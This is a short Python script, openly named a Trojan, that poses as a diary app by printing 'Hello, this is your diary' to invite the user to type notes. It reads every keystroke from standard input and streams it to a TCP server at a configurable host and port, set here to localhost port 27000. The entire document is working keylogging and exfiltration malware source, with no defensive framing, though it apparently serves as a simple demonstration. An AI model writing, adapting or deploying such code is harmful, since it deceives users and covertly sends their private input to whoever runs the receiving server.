#!/usr/bin/env python3


import logging
import socket
import sys


class Trojan:

    def __init__(self, host, port):

        self._host = host
        self._port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):

        return self._host

    @host.setter
    def host(self, new_host):

        self._host = new_host

    @property
    def port(self):

        return self._port

    @port.setter
    def port(self, new_port):

        self._port = new_port

    @property
    def socket(self):

        return self._socket

    def collect_data(self):

        try:
            self.socket.connect((self.host, self.port))

        except socket.error:
            logging.debug('Trojan could not connect to the server.')
            return

        print('Hello, this is your diary. You can type here your notes: ')

        while True:
            character = sys.stdin.read(1)
            self.socket.send(bytes(character, 'utf-8'))


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG)

    trojan = Trojan('localhost', 27000)
    trojan.collect_data()
